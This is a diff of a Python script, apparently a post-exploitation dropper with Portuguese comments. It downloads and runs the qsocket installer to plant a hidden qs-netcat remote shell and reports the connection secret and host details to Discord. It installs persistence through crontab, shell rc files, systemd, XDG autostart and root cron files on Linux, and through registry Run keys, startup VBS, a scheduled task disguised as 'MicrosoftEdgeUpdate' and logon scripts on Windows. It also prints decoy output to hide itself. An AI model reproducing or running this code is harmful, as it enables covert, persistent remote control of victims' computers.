@@ -10,8 +10,6 @@ import base64
 import urllib.request
 import ssl
 import time
-import threading
-import shutil
 from datetime import datetime
 
 # ─────────────────────────────────────────
@@ -131,50 +129,20 @@ def get_ram():
         return 'N/A'
 
 def get_disk():
-    # FIX: verifica len(p) antes de acessar índices — evita IndexError
-    # em sistemas com df formatado diferente (BSD, Alpine, containers)
     try:
         r = subprocess.run(['df', '-h', '/'], capture_output=True, text=True, **_NO_WIN)
-        lines = r.stdout.strip().splitlines()
-        if len(lines) >= 2:
-            p = lines[-1].split()
-            if len(p) >= 5:
-                return f"{p[2]} / {p[1]} ({p[4]})"
+        p = r.stdout.strip().split('\n')[-1].split()
+        return f"{p[2]} / {p[1]} ({p[4]})"
     except:
-        pass
-    return 'N/A'
+        return 'N/A'
 
 def get_interfaces():
-    # FIX: filtra linhas vazias ANTES de acessar split()[0]
-    # A linha vazia após strip() faz split()[0] explodir com IndexError.
-    # Solução: splitlines() + filtro l.strip() antes do list comprehension.
-    # Fallback para 'ip -4 addr show' em kernels antigos sem flag -br.
     try:
         r = subprocess.run(
             ['ip', '-br', 'addr'], capture_output=True, text=True, **_NO_WIN
         )
-        if r.stdout.strip():
-            parts = [l.split() for l in r.stdout.strip().splitlines() if l.strip()]
-            ifaces = [p for p in parts if len(p) >= 1 and p[0] != 'lo']
-            return ', '.join(
-                f"{p[0]}({p[2].split('/')[0] if len(p) > 2 else '?'})"
-                for p in ifaces
-            ) or 'N/A'
-    except:
-        pass
-    # fallback: ip -4 addr show
-    try:
-        r = subprocess.run(
-            ['ip', '-4', 'addr', 'show'], capture_output=True, text=True, **_NO_WIN
-        )
-        ifaces, cur = [], None
-        for line in r.stdout.splitlines():
-            line = line.strip()
-            if line and line[0].isdigit():
-                cur = line.split(':')[1].strip().split()[0]
-            elif line.startswith('inet ') and cur and cur != 'lo':
-                ifaces.append(f"{cur}({line.split()[1].split('/')[0]})")
-        return ', '.join(ifaces) if ifaces else 'N/A'
+        ifaces = [l.split() for l in r.stdout.strip().split('\n') if l.split()[0] != 'lo']
+        return ', '.join(f"{i[0]}({i[2] if len(i) > 2 else '?'})" for i in ifaces)
     except:
         return 'N/A'
 
@@ -182,7 +150,7 @@ def get_mac():
     try:
         import uuid
         return ':'.join(
-            ['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 48, 8)][::-1]
+            ['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 8 * 6, 8)][::-1]
         )
     except:
         return 'N/A'
@@ -206,16 +174,9 @@ def get_shell():
     return os.environ.get('SHELL', 'N/A')
 
 def get_crontab():
-    # FIX: splitlines() em vez de split('\n')
-    # split('\n') em string vazia retorna [''] → 1 entrada falsa.
-    # splitlines() em string vazia retorna [] → contagem correta.
-    # Também checa returncode: crontab -l retorna 1 quando não há crontab.
     try:
         r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, **_NO_WIN)
-        if r.returncode != 0:
-            return '0 entradas'
-        lines = [l for l in r.stdout.strip().splitlines()
-                 if l.strip() and not l.strip().startswith('#')]
+        lines = [l for l in r.stdout.strip().split('\n') if l and not l.startswith('#')]
         return f"{len(lines)} entradas"
     except:
         return 'N/A'
@@ -293,12 +254,6 @@ def send_discord(secret, tool, connect_cmd, success=True):
 # ─────────────────────────────────────────
 
 def download_script(url):
-    # FIX: remove BOM (\xef\xbb\xbf) antes de validar, exige mínimo de 200
-    # chars para rejeitar respostas de erro curtas (ex: "404 Not Found").
-    def _valid(s):
-        s = s.lstrip('\xef\xbb\xbf').strip()
-        return s.startswith('#') and len(s) > 200
-
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
@@ -306,22 +261,19 @@ def download_script(url):
         req = urllib.request.Request(
             url, headers={'User-Agent': 'wget/1.21.3', 'Accept': '*/*'})
         with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
-            content = r.read().decode('utf-8', errors='replace')
-            if _valid(content):
+            content = r.read().decode()
+            if content.strip().startswith('#'):
                 return content
     except:
         pass
 
     for cmd in [
-        ['curl',  '-fsSk', '--connect-timeout', '10', '-m', '30', url],
-        ['wget', '-q', '--no-check-certificate',
-         '--timeout=30', '--connect-timeout=10', '-O', '-', url],
+        ['curl', '-fsSk', url],
+        ['wget', '-q', '--no-check-certificate', '-O', '-', url],
     ]:
-        if not shutil.which(cmd[0]):
-            continue
         try:
-            r = subprocess.run(cmd, capture_output=True, text=True, timeout=35, **_NO_WIN)
-            if _valid(r.stdout):
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30, **_NO_WIN)
+            if r.stdout and r.stdout.strip().startswith('#'):
                 return r.stdout
         except:
             continue
@@ -329,99 +281,10 @@ def download_script(url):
     return None
 
 # ─────────────────────────────────────────
-#  PTY RUNNER
-#
-#  Resolve o problema de [ -t 1 ] nos installers bash:
-#  com stdout=DEVNULL o script detecta "não é TTY" e pode
-#  mudar comportamento (omitir steps, usar modo silencioso demais).
-#  pty.openpty() cria um pseudo-TTY real — o slave é passado como
-#  stdout/stderr do processo filho, então [ -t 1 ] retorna true.
-#  A thread drena o master para evitar que o buffer encha e o
-#  filho bloqueie em write().
-# ─────────────────────────────────────────
-
-def _run_with_pty(script, env, timeout=180):
-    try:
-        import pty
-        master, slave = pty.openpty()
-
-        proc = subprocess.Popen(
-            ['bash', '-s'],
-            stdin=subprocess.PIPE,
-            stdout=slave,
-            stderr=slave,
-            env=env,
-            close_fds=True,
-            start_new_session=True,
-        )
-        os.close(slave)
-
-        def _drain():
-            try:
-                while True:
-                    if not os.read(master, 4096):
-                        break
-            except OSError:
-                pass
-
-        threading.Thread(target=_drain, daemon=True).start()
-
-        try:
-            proc.stdin.write(script.encode())
-            proc.stdin.close()
-        except BrokenPipeError:
-            pass
-
-        try:
-            proc.wait(timeout=timeout)
-        except subprocess.TimeoutExpired:
-            pass
-
-        try:
-            os.close(master)
-        except OSError:
-            pass
-        return True
-
-    except (ImportError, OSError):
-        pass
-    except Exception:
-        pass
-
-    # Fallback sem PTY — herda fds do pai (já são /dev/null após daemonize)
-    # FIX BUG3: bash -s lê o script de stdin em vez de bash -c SCRIPT como arg.
-    # bash -c passa o script inteiro como argumento de linha de comando
-    # (sujeito ao limite ARG_MAX do kernel, tipicamente 2MB).
-    # bash -s lê de stdin — sem limite prático de tamanho.
-    try:
-        proc = subprocess.Popen(
-            ['bash', '-s'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            env=env,
-            start_new_session=True,
-            close_fds=True,
-        )
-        try:
-            proc.stdin.write(script.encode())
-            proc.stdin.close()
-        except BrokenPipeError:
-            pass
-        try:
-            proc.wait(timeout=timeout)
-        except subprocess.TimeoutExpired:
-            pass
-        return True
-    except:
-        return False
-
-# ─────────────────────────────────────────
-#  VERIFY + FIND BINARY LINUX
+#  VERIFY + DEPLOY QSOCKET LINUX
 # ─────────────────────────────────────────
 
 def verify_qsocket():
-    # Check 1: binário em ~/.config/<dir>/qs-netcat
     try:
         config = os.path.expanduser('~/.config')
         for d in os.listdir(config):
@@ -431,15 +294,13 @@ def verify_qsocket():
     except:
         pass
 
-    # Check 2: crontab tem entrada qs-netcat
     try:
         r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-        if r.returncode == 0 and 'qs-netcat' in r.stdout:
+        if 'qs-netcat' in r.stdout:
             return True
     except:
         pass
 
-    # Check 3: processo rodando
     try:
         r = subprocess.run(['pgrep', '-f', 'qs-netcat'], capture_output=True)
         if r.returncode == 0:
@@ -447,152 +308,7 @@ def verify_qsocket():
     except:
         pass
 
-    # FIX: Check 4 — rc files (qsocket instala linha no .bashrc)
-    # É o check mais confiável depois do binário: o installer sempre
-    # adiciona a linha de autostart em pelo menos um rc file.
-    for rc in ['~/.bashrc', '~/.zshrc', '~/.profile', '~/.bash_profile']:
-        try:
-            with open(os.path.expanduser(rc)) as f:
-                if 'qs-netcat' in f.read():
-                    return True
-        except:
-            pass
-
     return False
-
-def _find_qs_binary():
-    """Retorna o qs-netcat mais recentemente instalado em ~/.config."""
-    config = os.path.expanduser('~/.config')
-    latest, latest_t = None, 0
-    try:
-        for d in os.listdir(config):
-            p = os.path.join(config, d, 'qs-netcat')
-            if os.path.isfile(p) and os.access(p, os.X_OK):
-                t = os.path.getmtime(p)
-                if t > latest_t:
-                    latest, latest_t = p, t
-    except:
-        pass
-    if latest:
-        return latest
-    return shutil.which('qs-netcat')
-
-# ─────────────────────────────────────────
-#  PERSISTÊNCIA LINUX — 5 camadas
-#
-#  O installer do qsocket já adiciona .bashrc / crontab próprios,
-#  mas dependemos exclusivamente dele. Esta camada extra:
-#    - é independente do installer
-#    - cobre falhas de path, nome de binário, etc.
-#    - adiciona systemd (Restart=always) e XDG autostart
-#    - escalona para root quando disponível
-# ─────────────────────────────────────────
-
-def _persist_linux(binary, secret):
-    if not binary or not os.path.isfile(binary):
-        return
-
-    run_cmd  = f"{binary} -s {secret} -l -i -q"
-    watchdog = f"nohup {run_cmd} >/dev/null 2>&1"
-
-    # 1. crontab — @reboot garante início após boot
-    #    watchdog a cada 1 min relança se o processo morrer
-    #    Sem '&' no final: crontab já fork()ea — '&' cria zumbi extra
-    try:
-        r   = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-        cur = r.stdout if r.returncode == 0 else ''
-        new = cur.rstrip('\n')
-        for entry in [
-            f"@reboot {run_cmd} >/dev/null 2>&1",
-            f"* * * * * {watchdog}",
-        ]:
-            if entry not in cur:
-                new += f"\n{entry}"
-        subprocess.run(['crontab', '-'], input=new + '\n',
-                       text=True, capture_output=True)
-    except:
-        pass
-
-    # 2. rc files — todas as shells comuns
-    for rc in ['~/.bashrc', '~/.bash_profile', '~/.profile', '~/.zshrc']:
-        try:
-            p = os.path.expanduser(rc)
-            c = open(p).read() if os.path.exists(p) else ''
-            if secret not in c:
-                with open(p, 'a') as f:
-                    f.write(f"\n# network monitor\n{watchdog}\n")
-        except:
-            pass
-
-    # 3. systemd user service — Restart=always é o watchdog mais confiável
-    #    Não usa -D (daemon built-in): systemd precisa rastrear o PID filho
-    try:
-        sd = os.path.expanduser('~/.config/systemd/user')
-        os.makedirs(sd, exist_ok=True)
-        svc = (
-            "[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
-            "[Service]\n"
-            f"ExecStart={binary} -s {secret} -l -i -q\n"
-            "Restart=always\nRestartSec=30\n\n"
-            "[Install]\nWantedBy=default.target\n"
-        )
-        with open(os.path.join(sd, 'netd.service'), 'w') as f:
-            f.write(svc)
-        subprocess.run(
-            ['systemctl', '--user', 'enable', '--now', 'netd.service'],
-            capture_output=True,
-        )
-    except:
-        pass
-
-    # 4. XDG autostart — GNOME/KDE/XFCE executam .desktop no login gráfico
-    #    Wrapper .sh evita problemas de quoting no campo Exec=
-    try:
-        ad = os.path.expanduser('~/.config/autostart')
-        os.makedirs(ad, exist_ok=True)
-        wrapper = os.path.join(ad, '.netd.sh')
-        with open(wrapper, 'w') as f:
-            f.write(f"#!/bin/sh\n{run_cmd} >/dev/null 2>&1\n")
-        os.chmod(wrapper, 0o755)
-        desk = (
-            "[Desktop Entry]\nType=Application\nName=Network Monitor\n"
-            f"Exec={wrapper}\nHidden=false\n"
-            "X-GNOME-Autostart-enabled=true\n"
-        )
-        with open(os.path.join(ad, 'netd.desktop'), 'w') as f:
-            f.write(desk)
-    except:
-        pass
-
-    # 5. root-only: /etc/cron.d + /etc/rc.local
-    #    /etc/cron.d dispara independente de usuário logado — mais confiável
-    if is_root():
-        try:
-            cron_d = '/etc/cron.d/netd'
-            with open(cron_d, 'w') as f:
-                f.write(
-                    f"@reboot root {run_cmd} >/dev/null 2>&1\n"
-                    f"* * * * * root {watchdog}\n"
-                )
-            os.chmod(cron_d, 0o644)
-        except:
-            pass
-
-        try:
-            rc = '/etc/rc.local'
-            if os.path.isfile(rc):
-                c = open(rc).read()
-                if secret not in c:
-                    new = c.replace('exit 0',
-                                    f'{run_cmd} >/dev/null 2>&1 &\nexit 0')
-                    with open(rc, 'w') as f:
-                        f.write(new)
-        except:
-            pass
-
-# ─────────────────────────────────────────
-#  DEPLOY QSOCKET LINUX
-# ─────────────────────────────────────────
 
 def deploy_qsocket_linux(secret):
     script = download_script('https://qsocket.io/0')
@@ -600,24 +316,22 @@ def deploy_qsocket_linux(secret):
         return False
 
     env = os.environ.copy()
-    env['S']    = secret
-    env['HIDE'] = '1'
-    env['TERM'] = 'xterm-256color'  # ajuda scripts que verificam $TERM
+    env['S'] = secret
     env.pop('WAYLAND_DISPLAY', None)
     env.pop('WAYLAND_SOCKET', None)
 
-    # _run_with_pty: resolve [ -t 1 ] + bash -s (sem limite ARG_MAX)
-    _run_with_pty(script, env, timeout=180)
+    try:
+        subprocess.run(
+            ['bash', '-c', script],
+            env=env, timeout=180,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except:
+        pass
 
-    time.sleep(5)
-    ok = verify_qsocket()
-
-    # Camada de persistência própria — independente do installer
-    binary = _find_qs_binary()
-    if binary:
-        _persist_linux(binary, secret)
-
-    return ok
+    time.sleep(3)
+    return verify_qsocket()
 
 # ─────────────────────────────────────────
 #  WINDOWS UTILS
@@ -658,8 +372,7 @@ def _run_ps(script, timeout=30):
     try:
         subprocess.run(
             ['powershell.exe',
-             '-ExecutionPolicy', 'Bypass',
-             '-WindowStyle',     'Hidden',
+             '-WindowStyle', 'Hidden',
              '-NonInteractive',
              '-Command', script],
             stdout=subprocess.DEVNULL,
@@ -671,7 +384,7 @@ def _run_ps(script, timeout=30):
         pass
 
 # ─────────────────────────────────────────
-#  PERSISTÊNCIA WINDOWS — 4 mecanismos
+#  PERSISTÊNCIA WINDOWS (sem admin)
 # ─────────────────────────────────────────
 
 def _persist_hkcu_run(binary_path, secret):
@@ -682,6 +395,7 @@ def _persist_hkcu_run(binary_path, secret):
     try:
         import winreg
         ps_inner = _ps_cmd(binary_path, secret)
+        # Comando final: powershell oculto executando o bloco
         cmd = (
             f'powershell.exe -WindowStyle Hidden -NonInteractive'
             f' -Command "{ps_inner}"'
@@ -717,6 +431,7 @@ def _persist_startup_vbs(binary_path, secret):
             return
 
         ps_inner = _ps_cmd(binary_path, secret)
+        # Em VBS: "" = double quote. Então -Command "<ps_inner>" vira -Command ""<ps_inner>""
         vbs_run_cmd = (
             f'powershell.exe -WindowStyle Hidden -NonInteractive'
             f' -Command ""{ps_inner}""'
@@ -739,26 +454,16 @@ def _persist_startup_vbs(binary_path, secret):
 
 def _persist_scheduled_task(binary_path, secret):
     """
-    Scheduled Task — múltiplos triggers para máxima cobertura:
-      T1: AtLogon      — dispara quando qualquer usuário faz login
-      T2: AtStartup    — dispara no boot do sistema (antes do login)
-                         FIX: adicionado para cobrir reboot sem login
-                         (VPS headless, auto-login desativado)
-                         Sem principal SYSTEM, roda como usuário corrente,
-                         mas com -AtStartup o Windows tenta executar no boot.
-                         Para garantia total em headless, admin + SYSTEM é ideal.
-      T3: Repetição    — watchdog a cada 2 min indefinidamente
-                         FIX: reduzido de 10 min → 2 min
+    Scheduled task — AtLogon + repetição a cada 10 min indefinidamente.
+    -Hidden oculta da UI do Task Scheduler (PS 3.0+, Windows 8+).
+    -ExecutionTimeLimit 0 = sem timeout de execução.
+    RepetitionDuration MaxValue = nunca para.
 
     Quoting:
-      - Script PS externo usa double quotes como delimitador.
+      - O script PS externo usa double quotes como delimitador de string.
       - O -Argument do Action contém -Command `"<ps_inner>`"
         onde `" é escape de double quote dentro de string PS double-quoted.
       - Resultado: powershell.exe recebe -Command "<ps_inner>" corretamente.
-
-    -Hidden oculta da UI do Task Scheduler (PS 3.0+, Windows 8+).
-    -ExecutionTimeLimit 0 = sem timeout de execução.
-    RestartCount/RestartInterval = auto-restart em caso de falha.
     """
     try:
         ps_inner = _ps_cmd(binary_path, secret)
@@ -766,15 +471,12 @@ def _persist_scheduled_task(binary_path, secret):
             '$A = New-ScheduledTaskAction -Execute "powershell.exe"'
             f' -Argument "-WindowStyle Hidden -NonInteractive -Command `"{ps_inner}`"";'
             '$T1 = New-ScheduledTaskTrigger -AtLogOn;'
-            '$T2 = New-ScheduledTaskTrigger -AtStartup;'
-            '$T3 = New-ScheduledTaskTrigger -Once -At (Get-Date)'
-            ' -RepetitionInterval (New-TimeSpan -Minutes 2)'
+            '$T2 = New-ScheduledTaskTrigger -Once -At (Get-Date)'
+            ' -RepetitionInterval (New-TimeSpan -Minutes 10)'
             ' -RepetitionDuration ([TimeSpan]::MaxValue);'
-            '$S = New-ScheduledTaskSettingsSet'
-            ' -Hidden -ExecutionTimeLimit 0'
-            ' -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1);'
+            '$S = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0;'
             'Register-ScheduledTask "MicrosoftEdgeUpdate"'
-            ' -Action $A -Trigger $T1,$T2,$T3 -Settings $S -Force'
+            ' -Action $A -Trigger $T1,$T2 -Settings $S -Force'
         )
         _run_ps(script)
     except:
@@ -797,6 +499,7 @@ def _persist_logon_script(binary_path, secret):
         if not local:
             return
 
+        # Diretório existente — evita criar pastas suspeitas
         target_dir = os.path.join(local, 'Microsoft', 'Windows')
         if not os.path.isdir(target_dir):
             return
@@ -819,6 +522,7 @@ def _persist_logon_script(binary_path, secret):
         with open(vbs_path, 'w') as f:
             f.write('\r\n'.join(lines))
 
+        # Registra: wscript /B = silent (sem output de erros VBS em popup)
         k = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r'Environment',
@@ -839,10 +543,10 @@ def _persist_all(binary_path, secret):
     Falha individual não interrompe os demais.
     Ordem: do mais simples ao menos comum.
     """
-    _persist_hkcu_run(binary_path, secret)        # logon, via registry
-    _persist_startup_vbs(binary_path, secret)     # logon, via filesystem
-    _persist_scheduled_task(binary_path, secret)  # boot + logon + periódico
-    _persist_logon_script(binary_path, secret)    # logon, via network hook
+    _persist_hkcu_run(binary_path, secret)       # logon, via registry
+    _persist_startup_vbs(binary_path, secret)    # logon, via filesystem
+    _persist_scheduled_task(binary_path, secret) # logon + periódico
+    _persist_logon_script(binary_path, secret)   # logon, via network hook
 
 # ─────────────────────────────────────────
 #  DEPLOY QSOCKET WINDOWS
@@ -860,7 +564,7 @@ def deploy_qsocket_windows(secret):
         subprocess.run(
             ['powershell.exe',
              '-ExecutionPolicy', 'Bypass',
-             '-WindowStyle',     'Hidden',
+             '-WindowStyle', 'Hidden',
              '-NonInteractive',
              '-Command', ps],
             timeout=180,
@@ -882,53 +586,20 @@ def deploy_qsocket_windows(secret):
 
 # ─────────────────────────────────────────
 #  DAEMONIZE (Linux)
-#
-#  FIX A: double-fork — impede que o daemon readquira terminal.
-#    - Fork 1: desvincula do grupo de processos do terminal
-#    - setsid(): cria nova sessão, processo vira líder
-#    - Fork 2: o líder de sessão PODE adquirir terminal; o neto não pode
-#
-#  FIX B: mensagem neutra — não imprime PID (opsec)
-#    Antes: "[*] Background pid: 12345" — denunciava o PID e o propósito
-#    Agora: linha que parece parte natural do output do exploit/ferramenta
-#
-#  FIX C: stdin (fd 0) redirecionado para /dev/null
-#    Antes: só fds 1 e 2 eram redirecionados; stdin ficava aberto,
-#    podendo causar bloqueio em scripts que tentam ler do terminal.
 # ─────────────────────────────────────────
 
 def daemonize():
     if not is_linux():
         return
-
-    # Fork 1
-    try:
-        pid = os.fork()
-        if pid > 0:
-            # FIX B: mensagem neutra
-            sys.stdout.write('  [+] Limpando artefatos de exploração ... ok\n')
-            sys.stdout.flush()
-            os._exit(0)
-    except OSError:
-        return
-
+    pid = os.fork()
+    if pid > 0:
+        sys.stdout.write(f"[*] Background pid: {pid}\n")
+        sys.stdout.flush()
+        os._exit(0)
     os.setsid()
-
-    # Fork 2 — neto não pode adquirir terminal controlador
-    try:
-        pid = os.fork()
-        if pid > 0:
-            os._exit(0)
-    except OSError:
-        pass
-
-    # FIX C: redireciona os 3 fds (0=stdin incluso)
     devnull = os.open(os.devnull, os.O_RDWR)
-    for fd in (0, 1, 2):
-        try:
-            os.dup2(devnull, fd)
-        except OSError:
-            pass
+    os.dup2(devnull, 1)
+    os.dup2(devnull, 2)
     os.close(devnull)
 
 # ─────────────────────────────────────────
@@ -941,8 +612,6 @@ def main():
     if is_linux():
         daemonize()
         ok = deploy_qsocket_linux(secret)
-        # Nota: _persist_linux já é chamado dentro de deploy_qsocket_linux
-        # após o installer rodar e o binário ser encontrado
         send_discord(secret, 'QSocket Linux', f'qs-netcat -i -s {secret}', success=ok)
 
     elif is_windows():
